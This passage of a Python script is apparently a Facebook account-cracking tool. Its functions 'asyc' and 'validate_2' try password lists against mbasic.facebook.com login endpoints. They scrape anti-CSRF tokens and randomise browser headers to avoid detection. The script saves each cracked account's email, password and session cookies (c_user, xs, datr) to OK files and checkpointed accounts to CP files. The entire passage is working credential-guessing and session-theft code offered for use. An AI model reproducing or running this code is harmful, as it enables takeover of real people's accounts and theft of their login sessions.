				kuki = tttt(ses.cookies.get_dict())
				coek = ses.cookies.get_dict()
				cuak=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				print(f'\r{H} * --> {idf}|{pw}|{cuak}           {P}')
				open('VALID_OK/'+OK,'a').write(' * -----> '+idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(30)
	loop+=1
	
def asyc(idf,pwv,url):
	global loop,ok,cp
	ses = requests.Session()
	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	#ua = str(random.choice(open("ua.json","r").read().splitlines()))
	load = random.choice(["😍","🤩"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			url = "mbasic.facebook.com"
			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(memek.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(memek.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(memek.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(memek.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": AinkRaka}
			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"{K} * ---> {idf}|{pw}")
				open('CP/'+CP,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = tttt(ses.cookies.get_dict())
				coek = ses.cookies.get_dict()
				print(f" {H}* ---> {idf}|{pw}|{ua}")
				open('OK/'+OK,'a').write(' * -----> '+idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(30)
	loop+=1
	
def validate_2(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
	load = random.choice(["😝","😛"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			mek = random.randint(11,99)
			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[yellow]Potrait-XD CP").add(f"[yellow]{idf}|{pw}")
				tree.add(f"[yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[green]Potrait-XD OK").add(f"[green]{idf}|{pw}")
				tree.add(f"[purple]{kuki}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
def tttt(cooz):
	coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
	return(str(coki))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
	login_lagi()
	#crack_nama()
	#print(ugen)

